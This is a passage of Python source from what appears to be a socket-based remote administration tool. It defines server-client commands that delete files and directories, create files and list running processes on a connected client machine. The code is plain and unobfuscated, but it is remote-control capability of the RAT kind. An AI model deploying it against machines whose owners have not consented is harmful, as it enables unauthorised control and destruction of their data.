                return CommandResult(DoubleCommandResult.failure)
            case "d":
                print("Directory doesn't exist")
                return CommandResult(DoubleCommandResult.failure)
            case "p":
                print("The client does not have permission to remove such directory")
                return CommandResult(DoubleCommandResult.failure)
            case "f":
                print("That path is a file")
                return CommandResult(DoubleCommandResult.failure)
            case "y":
                print("Successfully deleted directory")
                return CommandResult(DoubleCommandResult.success)
            case _:
                print(
                    "Sent path, but client did not respond with a valid success indicator"
                )
                return CommandResult(DoubleCommandResult.semi_success)


@add_double_command(
    "del",
    "del [ file path ]",
    "Deletes a file on the client",
    [ArgumentType.string],
    EmptyReturn,
)
class DeleteFile(DoubleCommand):
    @staticmethod
    def client_side(sock: socket.socket) -> None:
        import os

        try:
            path = sock.recv(int.from_bytes(sock.recv(8)))
        except OSError:
            return

        try:
            os.remove(path)
        except PermissionError:
            status = "p"
        except FileNotFoundError:
            status = "d"
        except OSError:
            status = "n"
        else:
            status = "y"

        if os.path.isdir(path):
            status = "f"

        try:
            sock.sendall(status.encode("utf-8"))
        except OSError:
            return

    @staticmethod
    def server_side(client: "Client", params: tuple) -> CommandResult:
        try:
            path = params[0].encode("utf-8")
            client.socket.sendall(len(path).to_bytes(8))
            client.socket.sendall(path)
        except OSError:
            print("Failed to send path to client")
            return CommandResult(DoubleCommandResult.failure)

        try:
            status = client.socket.recv(1).decode("utf-8", "ignore")
        except OSError:
            print("Sent path, but client did not respond with a success indicator")
            return CommandResult(DoubleCommandResult.semi_success)

        match status:
            case "n":
                print("There was an error when deleting the file")
                return CommandResult(DoubleCommandResult.failure)
            case "d":
                print("Directory doesn't exist")
                return CommandResult(DoubleCommandResult.failure)
            case "p":
                print("The client does not have permission to remove such file")
                return CommandResult(DoubleCommandResult.failure)
            case "f":
                print("That path is a directory")
                return CommandResult(DoubleCommandResult.failure)
            case "y":
                print("Successfully deleted file")
                return CommandResult(DoubleCommandResult.success)
            case _:
                print(
                    "Sent path, but client did not respond with a valid success indicator"
                )
                return CommandResult(DoubleCommandResult.semi_success)


@add_double_command(
    "touch",
    "touch [ file path ]",
    "Creates a file on the client",
    [ArgumentType.string],
    EmptyReturn,
)
class MakeFile(DoubleCommand):
    @staticmethod
    def client_side(sock: socket.socket) -> None:
        import os.path

        try:
            path = sock.recv(int.from_bytes(sock.recv(8))).decode("utf-8", "ignore")
        except OSError:
            return

        try:
            if os.path.exists(path):
                raise FileExistsError("file already exists")
            open(path, "wb").close()
        except PermissionError:
            status = "p"
        except FileExistsError:
            status = "f"
        except FileNotFoundError:
            status = "d"
        except OSError:
            status = "n"
        else:
            status = "y"

        try:
            sock.sendall(status.encode("utf-8"))
        except OSError:
            return

    @staticmethod
    def server_side(client: "Client", params: tuple) -> CommandResult:
        try:
            path = params[0].encode("utf-8")
            client.socket.sendall(len(path).to_bytes(8))
            client.socket.sendall(path)
        except OSError:
            print("Failed to send path to client")
            return CommandResult(DoubleCommandResult.failure)

        try:
            status = client.socket.recv(1).decode("utf-8", "ignore")
        except OSError:
            print("Sent path, but client did not respond with a success indicator")
            return CommandResult(DoubleCommandResult.semi_success)

        match status:
            case "n":
                print("There was an error when creating the file")
                return CommandResult(DoubleCommandResult.failure)
            case "f":
                print("File already exists")
                return CommandResult(DoubleCommandResult.failure)
            case "d":
                print("Parent directory doesn't exist")
                return CommandResult(DoubleCommandResult.failure)
            case "p":
                print("The client does not have permission to create such file")
                return CommandResult(DoubleCommandResult.failure)
            case "y":
                print("Successfully created file")
                return CommandResult(DoubleCommandResult.success)
            case _:
                print(
                    "Sent path, but client did not respond with a valid success indicator"
                )
                return CommandResult(DoubleCommandResult.semi_success)


@add_double_command(
    "list_procs",
    "list_procs",
    "Lists processes running on the client",
    [],
    list[tuple[int, str]],
    required_client_modules=["psutil"],
)
class ListProcesses(DoubleCommand):
    @staticmethod
    def client_side(sock: socket.socket) -> EmptyReturn:
        import psutil

        for proc in psutil.process_iter(["pid", "name"]):
            try:
                # process pid
                if proc.pid == 0:
                    continue
                sock.sendall(proc.pid.to_bytes(4))
                # process name
                sock.sendall(len(proc.name().encode("utf-8")).to_bytes(2))
                sock.sendall(proc.name().encode("utf-8"))
            except psutil.Error:
                continue
            except OSError:
                return
        try:
            sock.sendall(int(0).to_bytes(4))
        except OSError:
            return

    @staticmethod
    def server_side(client: "Client", params: tuple) -> CommandResult:
        procs = []
        while True:
            try:
                pid = int.from_bytes(client.socket.recv(4))
                if pid == 0:
                    break
                proc_name = client.socket.recv(
                    int.from_bytes(client.socket.recv(2))
                ).decode("utf-8", "ignore")

                print(f"{pid} {'-' * (11 - len(str(pid)))}> {proc_name}")
                procs.append((pid, proc_name))
            except (OSError, MemoryError):
                break

        return CommandResult(DoubleCommandResult.success, procs)
